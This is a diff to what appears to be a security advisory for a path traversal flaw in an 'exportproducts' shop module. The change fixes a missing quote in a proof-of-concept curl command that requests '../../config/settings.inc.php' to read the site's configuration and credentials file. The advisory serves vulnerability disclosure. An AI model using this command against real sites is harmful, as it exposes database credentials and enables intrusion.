@@ -54,7 +54,7 @@ Note : We are forced to tag it as a high gravity due to the CWE type 22 but be w
 ## Proof of concept
 
 ```bash
-curl -v -d 'url=../../config/settings.inc.php' 'https://preprod.XX/modules/exportproducts/download.php
+curl -v -d 'url=../../config/settings.inc.php' 'https://preprod.XX/modules/exportproducts/download.php'
 ```
 
 ## Patch from 4.1.1
